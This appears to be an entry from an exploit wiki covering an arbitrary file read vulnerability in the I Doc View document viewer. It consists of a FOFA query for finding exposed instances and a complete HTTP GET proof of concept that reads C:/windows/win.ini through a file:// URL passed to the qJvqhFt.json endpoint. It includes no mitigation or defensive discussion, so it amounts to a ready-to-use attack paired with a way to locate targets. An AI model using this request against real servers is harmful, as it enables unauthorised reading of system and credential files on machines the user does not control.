## IDocView_qJvqhFt接口任意文件读取


## fofa
```
title="I Doc View"
```

## poc
```
GET /view/qJvqhFt.json?start=1&size=5&url=file%3A%2F%2F%2FC%3A%2Fwindows%2Fwin.ini&idocv_auth=sapi HTTP/1.1
Host:  
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36
Connection: close
Accept-Encoding: gzip, deflate, br
```

![ce0d852b440ac8879e92a2195011da03](https://github.com/wy876/wiki/assets/139549762/b1c29678-aef4-470e-9b44-2a4795b4b835)
